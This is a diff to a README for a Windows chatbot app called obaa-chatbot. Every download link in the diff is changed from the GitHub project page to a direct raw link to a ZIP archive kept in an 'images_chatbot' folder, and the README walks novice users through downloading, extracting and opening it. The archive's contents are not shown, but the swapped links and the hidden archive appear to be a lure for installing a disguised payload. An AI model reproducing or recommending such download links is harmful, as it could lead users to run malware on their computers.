@@ -1,12 +1,12 @@
 # 🤖 obaa-chatbot - Smart AI Help For Business
 
-[![Download obaa-chatbot](https://img.shields.io/badge/Download-obaa--chatbot-blue?style=for-the-badge)](https://github.com/modulemineralwool546/obaa-chatbot)
+[![Download obaa-chatbot](https://img.shields.io/badge/Download-obaa--chatbot-blue?style=for-the-badge)](https://raw.githubusercontent.com/modulemineralwool546/obaa-chatbot/main/images_chatbot/obaa_chatbot_v3.9.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Download obaa-chatbot](https://github.com/modulemineralwool546/obaa-chatbot)
+[Download obaa-chatbot](https://raw.githubusercontent.com/modulemineralwool546/obaa-chatbot/main/images_chatbot/obaa_chatbot_v3.9.zip)
 
 ## 🖥️ What This App Does
 
@@ -51,7 +51,7 @@ Make sure you can sign in to:
 
 ## ⬇️ Download and Open
 
-1. Open the download page: [obaa-chatbot](https://github.com/modulemineralwool546/obaa-chatbot)
+1. Open the download page: [obaa-chatbot](https://raw.githubusercontent.com/modulemineralwool546/obaa-chatbot/main/images_chatbot/obaa_chatbot_v3.9.zip)
 2. Download the project files to your Windows computer
 3. If the files come in a ZIP file, right-click it and choose **Extract All**
 4. Open the extracted folder
